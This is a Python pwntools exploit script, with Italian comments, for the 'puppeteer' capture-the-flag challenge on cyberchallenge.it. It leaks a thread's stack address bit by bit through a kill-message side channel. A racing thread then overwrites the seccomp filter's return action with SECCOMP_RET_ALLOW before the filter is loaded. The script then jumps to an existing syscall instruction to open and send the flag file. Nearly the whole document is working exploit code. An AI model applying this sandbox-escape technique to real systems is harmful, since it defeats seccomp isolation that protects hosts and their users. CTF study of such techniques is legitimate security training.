#!/usr/bin/env python3

from pwn import *
import warnings

# Suppress all warnings
warnings.filterwarnings("ignore", category=BytesWarning)
exe = ELF("./puppeteer_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# split tmux pane
#context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "critical"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc puppeteer.challs.cyberchallenge.it 37002"	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
set follow-fork-mode child
b *thread_entry
"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)


# situazione:
# seccomp su tutte le syscalls except for exit
# blacklistato opcode di syscall 	
# non puoi printare nulla 
# clear registri prima di jumpare allo shellcode; reset fs, gs base registers


"""
thread_new: viene creato un thread con id non utilizzato 
mmap di codice e stack a indirizzi casuali inizando da 0x69...000 e usando getrandom per fillare gli zeri 
metadata del thread copiati nel mapping dello stack, dopo ci aggiunge lo shellcode dell'utente 
invoca clone per creare il thread e jumpare al mapping del codice 

"""

"""
la seccomp viene prima copiata dalla rodata e poi dopo fatto il loading sul thread con prctl set seccomp! 
ho quindi una finestra di tempo in cui un altro thread potrebbe modificare il filtro seccomp e renderlo inutile 
per fare questo pero' dovrei conoscere l'indirizzo del thread -> mi serve un leak
altro problema: non potrei comunque usare l'opcode syscall siccome e' blacklistata non dalla seccomp ma dal programma stesso
"""


"""
bug: quando un thread viene killato, il suo id non viene "resettato", 
quindi se creo un altro thread con lo stesso id avra' lo stesso stack/code address
in thread_kill stampa due messaggi diversi a seconda se e' gia' terminato o no 
(killing thread...  se non terminato/already exited se gia' terminato)
step 1. scrivo un codice che entra in un loop se il bit dello stack == 1 (prendendolo da rsp) 
-> determino un bit dello stack alla volta a seconda del messaggio stampato (devo leakkare 28 bits)
step 2. creo un thread con un altro id che sovrascriva seccomp: 
	a. trovare l'offset sullo stack dell'istruzione BPF_RET che di norma ritorna 0x0 se e' fatta una syscall vietata
	b. sovrascrivere BPF_RET con 0x7fff0000 (SECCOMP_ACT_ALLOW) invece di SECCOMP_RET_KILL_THREAD -> posso fare syscall
"""


"""
ho comunque il problema di non poter usare syscall (blacklistata)
prima dello shellcode, nel codice viene chiamata exit (quindi syscall) 
offset 0xd dal thread mapping 
mi basta saltare a quell'offset
"""


def create(code):
	#print((code))
	sla(b'>',b'new')
	sl((asm(code)).hex().encode())
	ru(b'Thread created with ID ')
	return int(rl().strip())


def wait(id):
	sla(b'>',f"wait {id}")

def kill(id):
	sla(b'>', b'kill ' + str(id).encode())
	res = b'Killing thread' in rl() 
	wait(id)
	return res

def leak_stack():
	p = log.progress('leaking stack')
	stack = 0x690000000000

	for shift in range(40):
		p.status('%#x', stack)
	
	
		stack_payload = f"""
		bt rsp, {shift} /*checks if rsp addr bit at pos [shift] == 0 or 1*/
		jc one /*mantain busy loop*/
		ret 
		one:
			jmp one
		"""
		
		thread_id = create(stack_payload) # create thread
		assert thread_id == 1 
		sleep(0.1)
		bit_leak = 1 if kill(thread_id) else 0
		stack |= (bit_leak << shift) # add leaked bit

	p.success('%#x', stack)
	return stack

'''
offset bpf on the stack: 
00:0000│ rdi rsi r9 rsp 0x69ecf8d61fe0 ◂— 0x100000000
01:0008│                0x69ecf8d61fe8 —▸ 0x695ba4c41000 ◂— call 0x695ba4c4100f
0x8 

target: bpf + 0x24
'''



def main():	
	t1_stack = leak_stack()
	filter_addr = t1_stack + 0x18

	# ogni istruzione in un filtro = 8 bytes, bpf_ret e' la penultima
	bpf_ret = filter_addr + 0x24 # last instruction of bpf filter (filter is 6 dw long in ida)
	aleak('filter',filter_addr)
	aleak('bpf ret',bpf_ret)

	dummy = create("nop") # create dummy with same id as prev (to reclaim stack mapping of prev thread)
	assert dummy == 1

	# 2nd thread to overwrite seccomp 
	# spins forever writing to thread_1's stack in a busy loop, 
	# trying to modify its seccomp filter after it is written on the stack, but before it is loaded with prctl. 
	# -> change SECCOMP_RET_KILL_THREAD into SECCOMP_RET_ALLOW.
	overwrite_bpf = f"""
	movabs rax, {bpf_ret} 
	mov ebx, 0x7fff0000 /*SECCOMP_RET_ALLOW*/

	loop:
		mov [rax], ebx 
		jmp loop
	"""

	create(overwrite_bpf)
	wait(dummy) 

	# read flag with sendfile
	final_payload = """ 
	cmp r15, 1 /*thread id*/ 
	je sendfile 
	cmp r15, 2 
	je done 
	pop rbx 
	push rbx 
	add rbx, 8

	/* fd = open=("flag", O_RDONLY) */
	lea rdi, qword ptr [rip + flag]
	mov esi, 0 /*O_RDONLY*/ 
	mov eax, 2 /*SYS_OPEN*/ 

	/*set as done*/
	inc r15 
	jmp rbx /*re-jmp to prev rsp (code start)*/

	sendfile:
		/* sendfile(1, fd, NULL, 0x100) */ 
		mov edi, 1 
		mov rsi, rax 
		xor edx, edx 
		mov r10d, 0x100 
		mov eax, 40 /*SYS_sendfile*/ 

		inc r15 
		jmp rbx /*jmp to code start, reevaluate state*/

	done: 
		xor eax, eax 
		ret

	flag: 
		.asciz "flag"
	"""

	victim_id = create(final_payload) 
	assert victim_id == 1 
	
	data = r.clean(1).decode() 
	r.close() 

	print(data)

	r.interactive()


if __name__ == "__main__":
    main()
